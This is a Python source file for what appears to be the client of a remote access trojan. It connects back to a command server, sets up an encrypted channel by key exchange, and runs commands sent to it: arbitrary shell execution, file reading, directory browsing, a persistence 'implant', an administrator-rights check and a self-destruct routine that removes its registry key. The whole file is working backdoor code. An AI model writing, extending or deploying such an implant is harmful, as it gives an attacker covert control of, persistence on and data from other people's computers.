#!/usr/bin/env pyton

import os
import socket
import sys
from core.crypto import DiffieHellman, encrypt, decrypt
from core import pandora
from core import persist

CLIENT_COMMANDS = [ 'cat', 'execute', 'ls', 'cd', 'pwd', 'implant', 'isadmin', 'kill', 'apoc', 'ping' ]

# Determine platform of system
if sys.platform.startswith('win'):
    PLATFORM = 'Windows'
elif sys.platform.startswith('linux'):
    PLATFORM = 'Linux'
elif sys.platform.startswith('darwin'):
    PLATFORM = 'Macintosh'
else:
    print("Platform is not supported")
    sys.exit(1)

address = (('127.0.0.1', 50000))

class Client(object):
    def __init__( self, ip='127.0.0.1', port=4444 ):
        # Create a DH pub/priv key, assign ip and port.
        self.client_dhkey = DiffieHellman()
        self.ip = ip
        self.port = port

    def run(self):
        while True:
            try:
                self.conn = socket.create_connection(address)
                print("Connected to ", address)
            except:
                print("Retrying")
                continue

            # Store server key inside server object
            server = Server()
            server.pub_key, server.gen_key = self.exchange_key()
            try:
                self.loop(server)
            except ConnectionResetError:
                print("Server closed, retrying")
                pass

    def loop(self, server):
        while True:
            # Just a test send message, create a method to do this
            data = decrypt(self.conn.recv(2048), server.gen_key)
            cmd, _, action = data.partition(' ')
            print("Cmd: {} | Action: {}".format(cmd,action))
            
            results = ""
            if cmd in CLIENT_COMMANDS:
                if(cmd == "execute"):
                    try:
                        results = pandora.execute(action)
                        results = results.decode('utf-8')
                    except NameError:
                        print("Pandora issue")

                elif(cmd == "cat"):
                    results = pandora.cat(action)

                elif(cmd == "ls"):
                    results = pandora.ls(action)

                elif(cmd == "kill"):
                    self.conn.close()
                    sys.exit()

                elif(cmd == "cd"):
                    results = pandora.cd(action)

                elif(cmd == "pwd"):
                    results = pandora.pwd()

                elif(cmd == "implant"):
                    results = persist.run(PLATFORM)

                elif(cmd == "isadmin"):
                    results = pandora.isadmin(PLATFORM)

                elif(cmd == "apoc"):
                    self.conn.close()
                    ## make function to destroy self and removes reg key
                    pandora.seppuku(PLATFORM)

                elif(cmd == "ping"):
                    results = "ping"
                                        
                print("results: {}".format(results))
                self.send_msg(results, server)
            else:
                self.send_msg("Command not implemented", server)
                continue
            

    def exchange_key(self):
        # Receive the servers public key, send client public key, and then generate a key from the servers pub key
        server_pubkey = int(self.conn.recv(2048).decode('utf-8'))
        self.conn.send(str(self.client_dhkey.publicKey).encode('utf-8'))

        # Generate a shared key based on servers public key
        self.client_dhkey.genKey(server_pubkey)
        gen_key = self.client_dhkey.getKey()
        return server_pubkey, gen_key

    def send_msg(self, msg, server):
        enc_msg = encrypt(msg, server.gen_key)
        enc_len = str(sys.getsizeof(enc_msg))
        print("size of sending message: {}".format(enc_len))
        self.conn.send(enc_len.encode('utf-8'))
        self.conn.send(enc_msg)

    def recv_msg(self, server):
        dec_msg = decrypt(self.conn.recv(2048), server.gen_key)
        cmd, _, action = dec_msg.partition(' ')
        return cmd, _, action

class Server():
    def __init__(self, pub_key = None, gen_key = None):
        self.pub_key = pub_key
        self.gen_key = gen_key

def main():
    client = Client()
    client.run()

if __name__ == '__main__':
    main()
